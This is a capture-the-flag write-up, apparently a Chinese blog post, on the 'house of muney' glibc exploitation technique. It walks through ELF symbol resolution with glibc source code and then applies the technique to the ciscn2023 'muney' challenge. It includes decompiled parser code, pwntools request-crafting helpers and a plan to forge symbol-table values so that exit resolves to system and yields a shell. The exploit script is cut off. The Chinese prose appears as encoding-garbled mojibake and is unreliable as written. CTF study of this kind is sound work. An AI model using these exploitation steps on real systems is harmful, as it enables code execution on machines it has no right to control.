çš„è°ƒè¯•é…ç½®\nå…·ä½“glibcçš„ç¼–è¯‘å¯ä»¥å‚è€ƒå‰é¢çš„æ–‡ï¼Œæ³¨æ„ä¸€ä¸‹glibc-all-in-oneä¸‹è½½çš„ä¸œè¥¿è²Œä¼¼ä¸èƒ½ç›´æ¥ç”¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ï¼šhttps://ftp.gnu.org/gnu/glibc/\nå¯ä»¥æŒ‰ä»¥ä¸‹è„šæœ¬å¯åŠ¨ï¼Œéœ€è¦æ³¨æ„diræŒ‡å®šçš„ç›®å½•\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;,endian=&quot;little&quot;)p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./a.out&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)def debug(s=&#x27;&#x27;):    gdb.attach(p, s)    pause()cmd = &quot;&quot;&quot;dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf&quot;&quot;&quot;debug(cmd)p.interactive()\næ•ˆæœå¦‚ä¸‹\n[ELF]ä»¥ç®€å•çš„ç¨‹åºçœ‹çœ‹ELFæ–‡ä»¶çš„è§£æè¿‡ç¨‹\n//gcc sys1.c -fno-pie -g -o sys1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;char *buff;read(0,buff,0x15);//ä¸ºäº†è®©ç¨‹åºé•¿ä¸€ç‚¹å¥½ä¸‹æ–­ç‚¹system(&quot;/bin/sh&quot;);return 0;&#125;\nç»„æˆ elf æ–‡ä»¶çš„åŸºæœ¬å•ä½æ˜¯ sectionï¼Œå¯ä»¥ç¿»è¯‘ä¸ºèŠ‚ã€‚elf å¤´ä¼šå®šä¹‰èŠ‚å¤´è¡¨ï¼ŒèŠ‚å¤´è¡¨ä¸­å®šä¹‰äº†èŠ‚çš„æ•°é‡ã€æ¯ä¸ªèŠ‚çš„ç±»å‹ã€èµ·å§‹çš„è™šæ‹Ÿåœ°å€ã€‚ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„èŠ‚ä¸º.dynamic èŠ‚ï¼Œè¿™é‡Œé¢å­˜å‚¨è¿™ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„æè¿°ä¿¡æ¯ã€‚è¿™é‡Œçš„.dynamicèŠ‚å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½è¡¨ç¤ºå…¶å¯¹åº”çš„ç»“æ„ä½“ï¼š\ntypedef struct&#123;  Elf64_Sxword\td_tag;\t\t\t/* Dynamic entry type */  union    &#123;      Elf64_Xword d_val;\t\t/* Integer value */      Elf64_Addr d_ptr;\t\t\t/* Address value */    &#125; d_un;&#125; Elf64_Dyn;\ntagè¡¨ç¤ºçš„æ˜¯è¯¥å…ƒç´ ï¼ˆèŠ‚ï¼‰çš„ç±»å‹ï¼Œå¦‚readelfçš„ç»“æœä¸­çš„\n0x0000000000000005 (STRTAB)             0x4004380x0000000000000006 (SYMTAB)             0x4003c0\nåˆ™è¿™ä¿©å…ƒç´ çš„ç±»å‹åˆ†åˆ«ä¸ºSTRTABå’ŒSYMTABã€‚è€Œç¬¦å·è§£æä¸STRTABå’ŒSYMTABç›¸å…³ã€‚\nSTRTABæ˜¯å­—ç¬¦ä¸²è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ•´ä¸ªç¨‹åºæ‰€éœ€è¦ç”¨åˆ°çš„æ‰€æœ‰å­—ç¬¦ã€‚SYMTABåˆ™æ˜¯ç¬¦å·è¡¨ï¼Œå…¶æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š\ntypedef struct&#123;  Elf64_Word\tst_name;\t\t/* Symbol name (string tbl index) */  unsigned char\tst_info;\t\t/* Symbol type and binding */  unsigned char st_other;\t\t/* Symbol visibility */  Elf64_Section\tst_shndx;\t\t/* Section index */  Elf64_Addr\tst_value;\t\t/* Symbol value */  Elf64_Xword\tst_size;\t\t/* Symbol size */&#125; Elf64_Sym;\nst_nameè¡¨ç¤ºè¿™ä¸ªç¬¦å·æ‰€æè¿°çš„å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²è¡¨ä¸­çš„ä¸‹æ ‡ã€‚st_valueè¡¨ç¤ºç¬¦å·çš„å€¼ã€‚è€Œå½“ç¬¦å·æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–è€…å˜é‡çš„æ—¶å€™ï¼Œè¿™ä¸ªå€¼å°±ä»£è¡¨ç¬¦å·çš„è™šæ‹Ÿåœ°å€\né‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚æœèƒ½ç¯¡æ”¹st_nameå’Œst_valueï¼Œå°±èƒ½å°†æŸä¸€å‡½æ•°åŠ«æŒä¸ºå¦ä¸€å‡½æ•°ï¼Œé€ æˆä»£ç æ‰§è¡Œ\nSTRTABå’ŒSYMTABå®ç°äº†ç¬¦å·çš„å¯»æ‰¾ï¼Œä½†æ˜¯è¿˜éœ€è¦ç”¨é‡å®šä½è¡¨æ¥æè¿°é‚£äº›ç¬¦å·éœ€è¦é‡å®šä½é‡å®šä½è¡¨çš„æ•°æ®ç»“æ„ä¸ºï¼š\ntypedef struct&#123;  Elf64_Addr\tr_offset;\t\t/* Address */  Elf64_Xword\tr_info;\t\t\t/* Relocation type and symbol index */&#125; Elf64_Rel;\nä¸€èˆ¬åœ¨æŸ¥æ‰¾åŠ¨æ€ç¬¦å·çš„æ—¶å€™ï¼Œr_offsetä»£è¡¨å¯¹åº”ç¬¦å·åœ¨ got è¡¨ä¸­çš„åœ°å€,å³æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çš„\nelf.got[&#x27;function&#x27;]\næ‹¿åˆ°çš„åœ°å€r_infoä½ 32 ä½è¡¨ç¤ºé‡å®šä½å…¥å£çš„ç±»å‹ï¼Œé«˜ 32 ä½è¡¨ç¤ºè¿™ä¸ªé‡å®šä½ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ä¸‹æ ‡ã€‚\npltè¡¨å’Œgotè¡¨çš„äº‹å„¿åœ¨ç©æ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œret2libcçš„æ—¶å€™å°±æè¿‡äº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯pltè¡¨è·³è½¬åˆ°gotè¡¨ï¼Œè‹¥æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œåˆ™è§£æè¯¥å‡½æ•°çš„åœ°å€ï¼Œå¡«å…¥åˆ°gotè¡¨å†…ï¼Œä¹‹åæ¯æ¬¡è°ƒç”¨å°±ç›´æ¥ä½¿ç”¨çœŸå®åœ°å€è¿›è¡Œè·³è½¬\nçœ‹ä¸€ä¸‹ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶æ‰§è¡Œçš„æŒ‡ä»¤\npush npush ModuleIDjmp _dl_runtime_resolve\nè¿™é‡Œçš„ n å¯¹åº”çš„æ˜¯è¯¥ç¬¦å·åœ¨ rel.plt é‡å®šä½è¡¨ä¸­çš„ä¸‹æ ‡ModuleIDä¸€èˆ¬æ˜¯ç¨‹åºçš„linkmapç»“æ„ä½“çš„åœ°å€æ¥ä¸‹æ¥è·³åˆ°_dl_runtime_resolveï¼Œçœ‹ä¸€æ‰‹_dl_runtime_resolve_xsavec.å…ˆä¿æŠ¤äº†ä¸€æ³¢ç°åœºï¼Œå†calläº†dl_fixupï¼Œçœ‹çœ‹dl_fixup(dl-runtime.c,line 52)\n/* This function is called through a special trampoline from the PLT the first time each PLT entry is called.  We must perform the relocation specified in the PLT of the given shared object, and return the resolved function address to the trampoline, which will restart the original call to that address.Future calls will bounce directly from the PLT to the   function.  */DL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t   SYMBOL_ADDRESS (result, sym, false));    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125;\nå…¶ä¸­è°ƒç”¨äº†_dl_lookup_symbol_xæ¥å¯»æ‰¾ç¬¦å·ï¼Œå®é™…è°ƒç”¨äº†do_lookup_xï¼Œè¿™ä¸ªå‡½æ•°åœ¨dl-lookup.c,line358\n/* Inner part of the lookup functions.  We return a value &gt; 0 if we   found the symbol, the value 0 if nothing is found and &lt; 0 if   something bad happened.  */static int__attribute_noinline__do_lookup_x (const char *undef_name, uint_fast32_t new_hash,\t     unsigned long int *old_hash, const ElfW(Sym) *ref,\t     struct sym_val *result, struct r_scope_elem *scope, size_t i,\t     const struct r_found_version *const version, int flags,\t     struct link_map *skip, int type_class, struct link_map *undef_map)&#123;  size_t n = scope-&gt;r_nlist;  /* Make sure we read the value before proceeding.  Otherwise we     might use r_list pointing to the initial scope and r_nlist being     the value after a resize.  That is the only path in dl-open.c not     protected by GSCOPE.  A read barrier here might be to expensive.  */  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));  struct link_map **list = scope-&gt;r_list;  do    &#123;      const struct link_map *map = list[i]-&gt;l_real;      /* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */      if (map == skip)\tcontinue;      /* Don&#x27;t search the executable when resolving a copy reloc.  */      if ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; map-&gt;l_type == lt_executable)\tcontinue;      /* Do not look into objects which are going to be removed.  */      if (map-&gt;l_removed)\tcontinue;      /* Print some debugging info if wanted.  */      if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))\t_dl_debug_printf (&quot;symbol=%s;  lookup in file=%s [%lu]\\n&quot;,\t\t\t  undef_name, DSO_FILENAME (map-&gt;l_name),\t\t\t  map-&gt;l_ns);      /* If the hash table is empty there is nothing to do here.  */      if (map-&gt;l_nbuckets == 0)\tcontinue;      Elf_Symndx symidx;      int num_versions = 0;      const ElfW(Sym) *versioned_sym = NULL;      /* The tables for this map.  */      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);      const ElfW(Sym) *sym;      const ElfW(Addr) *bitmask = map-&gt;l_gnu_bitmask;      if (__glibc_likely (bitmask != NULL))\t&#123;        //è·å–bitmask_word\t  ElfW(Addr) bitmask_word\t    = bitmask[(new_hash / __ELF_NATIVE_CLASS)\t\t      &amp; map-&gt;l_gnu_bitmask_idxbits];\t  unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);\t  unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)\t\t\t\t   &amp; (__ELF_NATIVE_CLASS - 1));\t  if (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)\t\t\t\t&amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1))\t    &#123;          //è·å–bucket\t      Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash\t\t\t\t\t\t     % map-&gt;l_nbuckets];\t      if (bucket != 0)\t\t&#123;            //hasharr \t\t  const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];\t\t  do\t\t    if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0)\t\t      &#123;\t\t\tsymidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);\t\t\tsym = check_match (undef_name, ref, version, flags,\t\t\t\t\t   type_class, &amp;symtab[symidx], symidx,\t\t\t\t\t   strtab, map, &amp;versioned_sym,\t\t\t\t\t   &amp;num_versions);\t\t\tif (sym != NULL)\t\t\t  goto found_it;\t\t      &#125;\t\t  while ((*hasharr++ &amp; 1u) == 0);\t\t&#125;\t    &#125;\t  /* No symbol found.  */\t  symidx = SHN_UNDEF;\t&#125;      else\t&#123;\t  if (*old_hash == 0xffffffff)\t    *old_hash = _dl_elf_hash (undef_name);\t  /* Use the old SysV-style hash table.  Search the appropriate\t     hash bucket in this object&#x27;s symbol table for a definition\t     for the same symbol name.  */\t  for (symidx = map-&gt;l_buckets[*old_hash % map-&gt;l_nbuckets];\t       symidx != STN_UNDEF;\t       symidx = map-&gt;l_chain[symidx])\t    &#123;\t      sym = check_match (undef_name, ref, version, flags,\t\t\t\t type_class, &amp;symtab[symidx], symidx,\t\t\t\t strtab, map, &amp;versioned_sym,\t\t\t\t &amp;num_versions);\t      if (sym != NULL)\t\tgoto found_it;\t    &#125;\t&#125;      /* If we have seen exactly one versioned symbol while we are\t looking for an unversioned symbol and the version is not the\t default version we still accept this symbol since there are\t no possible ambiguities.  */      sym = num_versions == 1 ? versioned_sym : NULL;      if (sym != NULL)\t&#123;\tfound_it:\t  /* When UNDEF_MAP is NULL, which indicates we are called from\t     do_lookup_x on relocation against protected data, we skip\t     the data definion in the executable from copy reloc.  */\t  if (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA\t      &amp;&amp; undef_map == NULL\t      &amp;&amp; map-&gt;l_type == lt_executable\t      &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)\t    &#123;\t      const ElfW(Sym) *s;\t      unsigned int i;#if ! ELF_MACHINE_NO_RELA\t      if (map-&gt;l_info[DT_RELA] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELASZ] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val != 0)\t\t&#123;\t\t  const ElfW(Rela) *rela\t\t    = (const ElfW(Rela) *) D_PTR (map, l_info[DT_RELA]);\t\t  unsigned int rela_count\t\t    = map-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val / sizeof (*rela);\t\t  for (i = 0; i &lt; rela_count; i++, rela++)\t\t    if (elf_machine_type_class (ELFW(R_TYPE) (rela-&gt;r_info))\t\t\t== ELF_RTYPE_CLASS_COPY)\t\t      &#123;\t\t\ts = &amp;symtab[ELFW(R_SYM) (rela-&gt;r_info)];\t\t\tif (!strcmp (strtab + s-&gt;st_name, undef_name))\t\t\t  goto skip;\t\t      &#125;\t\t&#125;#endif#if ! ELF_MACHINE_NO_REL\t      if (map-&gt;l_info[DT_REL] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELSZ] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val != 0)\t\t&#123;\t\t  const ElfW(Rel) *rel\t\t    = (const ElfW(Rel) *) D_PTR (map, l_info[DT_REL]);\t\t  unsigned int rel_count\t\t    = map-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val / sizeof (*rel);\t\t  for (i = 0; i &lt; rel_count; i++, rel++)\t\t    if (elf_machine_type_class (ELFW(R_TYPE) (rel-&gt;r_info))\t\t\t== ELF_RTYPE_CLASS_COPY)\t\t      &#123;\t\t\ts = &amp;symtab[ELFW(R_SYM) (rel-&gt;r_info)];\t\t\tif (!strcmp (strtab + s-&gt;st_name, undef_name))\t\t\t  goto skip;\t\t      &#125;\t\t&#125;#endif\t    &#125;\t  /* Hidden and internal symbols are local, ignore them.  */\t  if (__glibc_unlikely (dl_symbol_visibility_binds_local_p (sym)))\t    goto skip;\t  switch (ELFW(ST_BIND) (sym-&gt;st_info))\t    &#123;\t    case STB_WEAK:\t      /* Weak definition.  Use this value if we don&#x27;t find another.  */\t      if (__glibc_unlikely (GLRO(dl_dynamic_weak)))\t\t&#123;\t\t  if (! result-&gt;s)\t\t    &#123;\t\t      result-&gt;s = sym;\t\t      result-&gt;m = (struct link_map *) map;\t\t    &#125;\t\t  break;\t\t&#125;\t      /* FALLTHROUGH */\t    case STB_GLOBAL:\t      /* Global definition.  Just what we need.  */\t      result-&gt;s = sym;\t      result-&gt;m = (struct link_map *) map;\t      return 1;\t    case STB_GNU_UNIQUE:;\t      do_lookup_unique (undef_name, new_hash, (struct link_map *) map,\t\t\t\tresult, type_class, sym, strtab, ref,\t\t\t\tundef_map, flags);\t      return 1;\t    default:\t      /* Local symbols are ignored.  */\t      break;\t    &#125;\t&#125;skip:      ;    &#125;  while (++i &lt; n);  /* We have not found anything until now.  */  return 0;&#125;static uint_fast32_tdl_new_hash (const char *s)&#123;  uint_fast32_t h = 5381;  for (unsigned char c = *s; c != &#x27;\\0&#x27;; c = *++s)    h = h * 33 + c;  return h &amp; 0xffffffff;&#125;\nè¿™ä¸ªå‡½æ•°å°±æ˜¯å¯»æ‰¾ç¬¦å·çš„å…³é”®\n[house_of_muney]ç»¼ä¸Šï¼Œä¼ªé€ ä»¥ä¸‹å‡ ä¸ªå€¼å°±èƒ½åŠ«æŒè§£æå‡½æ•°æŒ‡å‘æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ï¼š\nbitmask_wordbuckethasharrtarget symbol -&gt;st_value\nç›´æ¥ä¸Šé¢˜[ciscn2023]muneychecksecè¿›å»å…ˆæ‰¾åˆ°ä¸€æ³¢â€œèœå•â€åŒæ—¶çœ‹åˆ°sub_401376å‡½æ•°\n__int64 __fastcall sub_401376(const char *a1, _BYTE *a2, int a3)&#123;  const char *v4; // rax  const char *v5; // rax  char *v6; // rax  char *v7; // rax  char *v8; // rax  char *v9; // rax  char *v11; // [rsp+18h] [rbp-28h]  char *v12; // [rsp+18h] [rbp-28h]  char *v13; // [rsp+18h] [rbp-28h]  char *v14; // [rsp+18h] [rbp-28h]  char *v15; // [rsp+18h] [rbp-28h]  char *v16; // [rsp+18h] [rbp-28h]  char *v17; // [rsp+18h] [rbp-28h]  char *v18; // [rsp+18h] [rbp-28h]  char *i; // [rsp+18h] [rbp-28h]  char *v20; // [rsp+18h] [rbp-28h]  int v21; // [rsp+20h] [rbp-20h]  _BOOL4 v22; // [rsp+24h] [rbp-1Ch]  int v23; // [rsp+28h] [rbp-18h]  const char **v24; // [rsp+30h] [rbp-10h]  if ( a3 != 1 &amp;&amp; a3 != 2 )    return 0xFFFFFFFFLL;  memset(a2, 0, 0x140uLL);  *a2 = a3;  if ( a3 == 1 )    v4 = a1;  else    v4 = 0LL;  *((_QWORD *)a2 + 1) = v4;  if ( a3 == 2 )    v5 = a1;  else    v5 = 0LL;  *((_QWORD *)a2 + 3) = v5;  v11 = strchr(a1, 32);  if ( !v11 )    return 400LL;  *v11 = 0;  v12 = v11 + 1;  v21 = 0;  if ( a3 == 1 )  &#123;    if ( !strcmp(&quot;GET&quot;, *((const char **)a2 + 1)) )      v21 = 4;    if ( !v21 &amp;&amp; !strcmp(&quot;HEAD&quot;, *((const char **)a2 + 1)) )      v21 = 5;    if ( !v21 &amp;&amp; !strcmp(&quot;POST&quot;, *((const char **)a2 + 1)) )      v21 = 5;    if ( !v21 &amp;&amp; !strcmp(&quot;PUT&quot;, *((const char **)a2 + 1)) )      v21 = 4;    if ( !v21 &amp;&amp; !strcmp(&quot;DELETE&quot;, *((const char **)a2 + 1)) )      v21 = 7;    if ( !v21 &amp;&amp; !strcmp(&quot;TRACE&quot;, *((const char **)a2 + 1)) )      v21 = 6;    if ( !v21 &amp;&amp; !strcmp(&quot;OPTIONS&quot;, *((const char **)a2 + 1)) )      v21 = 8;    if ( !v21 &amp;&amp; !strcmp(&quot;CONNECT&quot;, *((const char **)a2 + 1)) )      v21 = 8;    if ( !v21 &amp;&amp; !strcmp(&quot;PATCH&quot;, *((const char **)a2 + 1)) )      v21 = 6;    if ( !v21 )      return 400LL;  &#125;  else if ( !strcmp(&quot;HTTP/1.0&quot;, *((const char **)a2 + 3)) &amp;&amp; !strcmp(&quot;HTTP/1.1&quot;, *((const char **)a2 + 3)) )  &#123;    return 400LL;  &#125;  if ( a3 == 1 )    v6 = v12;  else    v6 = 0LL;  *((_QWORD *)a2 + 2) = v6;  if ( a3 == 2 )    v7 = v12;  else    v7 = 0LL;  *((_QWORD *)a2 + 4) = v7;  v13 = strchr(v12, 32);  if ( !v13 )    return 414LL;  *v13 = 0;  v14 = v13 + 1;  if ( a3 == 1 &amp;&amp; strchr(*((const char **)a2 + 2), 47) != *((char **)a2 + 2) )    return 400LL;  if ( a3 == 2 &amp;&amp; !atoi(*((const char **)a2 + 4)) )    return 400LL;  if ( a3 == 1 )    v8 = v14;  else    v8 = (char *)*((_QWORD *)a2 + 3);  *((_QWORD *)a2 + 3) = v8;  if ( a3 == 2 )    v9 = v14;  else    v9 = 0LL;  *((_QWORD *)a2 + 5) = v9;  v15 = strchr(v14, 10);  if ( !v15 )    return 400LL;  *v15 = 0;  v16 = v15 + 1;  if ( *v16 == 13 )    *v16++ = 0;  if ( a3 == 1 &amp;&amp; !strcmp(&quot;HTTP/1.0&quot;, *((const char **)a2 + 3)) &amp;&amp; !strcmp(&quot;HTTP/1.1&quot;, *((const char **)a2 + 3)) )    return 400LL;  v22 = 0;  v23 = 0;  while ( !*v16 || *v16 != 10 &amp;&amp; (*v16 != 13 || v16[1] != 10) )  &#123;    if ( v23 &lt;= 15 )      *(_QWORD *)&amp;a2[16 * v23 + 48] = v16;    v18 = strchr(v16, 58);    if ( !v18 )      return 413LL;    *v18 = 0;    for ( i = v18 + 1; *i &amp;&amp; (*i == 32 || *i == 13 || *i == 10 || *i == 9); ++i )      *i = 0;    if ( !*i )      return 413LL;    if ( v23 &lt;= 15 )      *(_QWORD *)&amp;a2[16 * v23 + 56] = i;    v20 = strchr(i, 10);    if ( !v20 )      return 413LL;    *v20 = 0;    v16 = v20 + 1;    if ( *v16 == 13 )      *v16++ = 0;    v24 = (const char **)&amp;a2[16 * v23 + 48];    if ( a3 == 1 )    &#123;      if ( !strcasecmp(&quot;Connection&quot;, *v24) )      &#123;        if ( *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) == 48 &amp;&amp; !strcasecmp(&quot;Keep-Alive&quot;, v24[1]) )        &#123;          a2[313] = 1;        &#125;        else if ( *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) == 49 &amp;&amp; !strcasecmp(&quot;Close&quot;, v24[1]) )        &#123;          a2[313] = 0;        &#125;        a2[312] = a2[313] == 0;      &#125;      if ( !strcasecmp(&quot;Accept-Encoding&quot;, *v24) &amp;&amp; strstr(v24[1], &quot;gzip&quot;) )        a2[314] = 1;      if ( !strcasecmp(&quot;Content-Length&quot;, *v24) )        *((_DWORD *)a2 + 79) = atoi(v24[1]);      if ( !v22 )        v22 = strcasecmp(&quot;Host&quot;, *v24) == 0;    &#125;    ++v23;  &#125;  *v16 = 0;  v17 = v16 + 1;  if ( *v17 == 10 )    *v17++ = 0;  if ( a3 != 1 )    goto LABEL_126;  if ( !a2[313] &amp;&amp; !a2[312] )  &#123;    a2[313] = *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) != 48;    a2[312] = a2[313] == 0;  &#125;  if ( *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) == 49 &amp;&amp; !v22 )    return 400LL;LABEL_126:  *((_QWORD *)a2 + 38) = v17;  return 0LL;&#125;\nä¸»è¦å°±æ˜¯å¯¹è¾“å…¥çš„è§£æï¼Œå¯çŸ¥è¦ä»¥httpè¯·æ±‚å¤´çš„æ ¼å¼æ¥è¾“å…¥ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\ndef menu(content):    p.sendafter(&#x27;HTTP_Parser&gt; &#x27;, content)def add(size):    header = f&#x27;&#x27;&#x27;POST /create HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipSize: &#123;size&#125;Content-Length: &#123;str(0x80)&#125;\\n&#x27;&#x27;&#x27;    payload = header + &#x27;a&#x27; * 0x80    menu(payload)def edit(index, offset, length, content):    header = f&#x27;&#x27;&#x27;POST /edit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipContent-Length: &#123;length&#125;Idx: &#123;index&#125;Offset: &#123;offset&#125;\\n&#x27;&#x27;&#x27;    payload = header.encode() + content    menu(payload)def delete(index):    header = f&#x27;&#x27;&#x27;POST /delete HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipIdx: &#123;index&#125;\\n&#x27;&#x27;&#x27;    menu(header)def quit():    header = f&#x27;&#x27;&#x27;POST /quit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzip\\n&#x27;&#x27;&#x27;\nå†çœ‹åˆ°â€œcreateâ€çš„è§„åˆ™å‘ç°ç”³è¯·çš„å †å—æœ€å°ä¸º0x100000ï¼Œå› æ­¤æˆ‘ä»¬ç”³è¯·çš„å †å—éƒ½ä¼šèµ°mmapã€‚mmapç”³è¯·çš„å†…å­˜ä¸€èˆ¬ä½äºlibc.so.6å†…å­˜çš„ä½åœ°å€å¤„ã€‚å¦‚æœå¯ä»¥ä¿®æ”¹mmapç”³è¯·çš„è¿™æ®µå†…å­˜çš„sizeï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¬¡ç”³è¯·å›æ¥å°±å¯ä»¥è¦†ç›–æ‰libc.so.6çš„ç¬¦å·è¡¨\neditå‡½æ•°é‡Œå‘ç°äº†ä¸€å¤„æ¼æ´ï¼šè¿™é‡Œæ²¡æœ‰å¯¹è´Ÿæ•°è¿›è¡Œæ£€æŸ¥ï¼Œeditå¯ä»¥å‘ä½åœ°å€æ–¹å‘å†™å…¥æ•°æ®ã€‚\nå› æ­¤ï¼Œå…ˆç”³è¯·ä¸€ä¸ªå †å—ï¼Œå†åˆ©ç”¨editä¸­çš„æ´ä¿®æ”¹å…¶sizeï¼Œfreeæ‰è¯¥å †å—åå†æ¬¡ç”³è¯·å®ƒï¼Œå°±èƒ½é€ æˆä»»æ„å†™\næœ‰ä¸€å¤„exit(â€œ&#x2F;bin&#x2F;shâ€)\nå¯ä»¥åŠ«æŒå‡½æ•°è§£æï¼Œå°†exitè§£æä¸ºsystemå³å¯å®ç°system(â€œ&#x2F;bin&#x2F;shâ€)\næ¥ä¸‹æ¥å»æ‰¾é‚£å‡ ä¸ªéœ€è¦ä¼ªé€ çš„å€¼çš„ä½ç½®\nbitmask_wordbuckethasharrtarget symbol -&gt;st_value\nä½¿ç”¨glibcæºç çº§çš„è°ƒè¯•ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\nfrom pwn import *from pwn import p64, p32, p16, p8context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./muney&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./muney&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)#p = 